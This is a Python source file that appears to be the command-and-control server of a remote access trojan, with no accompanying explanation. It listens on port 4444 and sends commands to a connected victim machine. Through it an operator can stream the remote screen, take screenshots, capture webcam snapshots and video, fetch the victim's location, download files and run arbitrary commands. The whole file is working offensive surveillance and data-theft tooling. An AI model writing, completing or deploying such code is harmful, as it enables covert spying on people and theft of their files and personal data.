import os
import socket
import threading
import cv2
import numpy as np
from datetime import datetime

SERVER = "YOUR IP ADDRESS"
PORT = 4444
SAVE_DIR = "received_files"

if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))
s.listen(1)

# Function to receive files from the client
def receive_file(file_name, client_socket):
    try:
        file_size = int.from_bytes(client_socket.recv(8), byteorder='big')
        file_path = os.path.join(SAVE_DIR, file_name)
        received_size = 0
        with open(file_path, "wb") as f:
            while received_size < file_size:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                f.write(chunk)
                received_size += len(chunk)
        print(f'[+] Saved file: {file_path}')
    except Exception as e:
        print(f"Error downloading file: {e}")

# Function to start remote screen thread
def start_remote_screen_thread(client_socket, stop_streaming_event):
    try:
        while not stop_streaming_event.is_set():
            screen_size_bytes = client_socket.recv(8)
            if not screen_size_bytes:
                break
            screen_size = int.from_bytes(screen_size_bytes, byteorder='big')
            screen_data = b''
            while len(screen_data) < screen_size:
                chunk = client_socket.recv(min(screen_size - len(screen_data), 4096))
                if not chunk:
                    break
                screen_data += chunk
            if len(screen_data) == screen_size:
                screen_np = np.frombuffer(screen_data, dtype=np.uint8)
                screen = cv2.imdecode(screen_np, cv2.IMREAD_COLOR)
                cv2.imshow('Remote Screen', screen)
                if cv2.waitKey(1) == 27 or stop_streaming_event.is_set():  # ESC key or stop streaming command
                    break
    except Exception as e:
        print(f"Error streaming remote screen: {e}")
    finally:
        cv2.destroyAllWindows()

# Main loop to accept client connections
while True:
    print(f'[*] Listening as {SERVER}:{PORT}')
    client_socket, client_addr = s.accept()
    print(f'[+] Client connected {client_addr}')
    client_socket.send('connected'.encode())
    stop_streaming_event = threading.Event()  # Create Event object
    while True:
        cmd = input('>>> ')
        client_socket.send(cmd.encode())
        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break
        elif cmd.lower() == 'remote_screen':
            start_remote_screen_thread(client_socket, stop_streaming_event)  # Pass Event object
        elif cmd.lower() == 'stop_streaming':
            stop_streaming_event.set()  # Set Event to stop streaming
        elif cmd.lower() in ['screenshot', 'ls', 'cd ', 'webcam_snapshot', 'location']:
            if cmd.lower() == 'screenshot':
                receive_file(f"screenshot_{datetime.now().strftime('%Y%m%d-%H%M%S')}.png", client_socket)
            elif cmd.lower() == 'webcam_snapshot':
                receive_file(f"webcam_snapshot_{datetime.now().strftime('%Y%m%d-%H%M%S')}.png", client_socket)
            elif cmd.lower() == 'location':
                try:
                    location = client_socket.recv(4096).decode()
                    print(f"[+] Client location: {location}")
                except Exception as e:
                    print(f"Error fetching location: {e}")
            else:
                result = client_socket.recv(4096).decode()
                print(result)
        elif cmd.lower().startswith('webcam_video'):
            if len(cmd.split()) < 2:
                print("Usage: webcam_video <duration>")
                continue
            receive_file(f"webcam_video_{datetime.now().strftime('%Y%m%d-%H%M%S')}.mp4", client_socket)
        elif cmd.startswith('download '):
            file_name = cmd[9:]
            receive_file(file_name, client_socket)
        else:
            result = client_socket.recv(4096).decode()
            print(result)
        print('>>>')
    client_socket.close()
    cmd = input('Wait for new client y/n ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
